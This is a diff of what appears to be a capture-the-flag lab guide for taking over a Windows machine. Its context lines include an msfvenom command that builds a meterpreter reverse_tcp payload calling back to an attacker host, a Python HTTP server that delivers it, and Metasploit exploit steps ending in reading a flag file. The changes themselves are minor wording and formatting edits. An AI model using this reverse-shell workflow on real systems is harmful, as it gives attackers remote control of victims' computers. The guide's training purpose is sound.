@@ -1,6 +1,6 @@
 # Guide
 
-Before you move to the exploit, make sure you allow the ports 8080 and 443 in your firewall.
+Before you move to the exploit, make sure you allow the ports 8080 and 443 in the firewall of your attacker machine.
 
 1 - On your */home/[user]/* of your attacker machine, do :
 
@@ -9,6 +9,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[HOST_IP] LPORT=443 -a x64
 ```
 
 2 - Launch a HTTP server on your attacker machine :
+
 ```
 python3 -m http.server 8080
 ```
@@ -70,11 +71,13 @@ set LPORT 8080
 It will set options.
 
 To verify your options :
+
 ```
 show options
 ```
 
 To exploit :
+
 ```
 exploit
 ```
@@ -95,7 +98,7 @@ cd ..
 cd Users
 cd admin
 cd Documents
-cat flag.txt
+cat flag2.txt
 ```
 
 Congratulations !
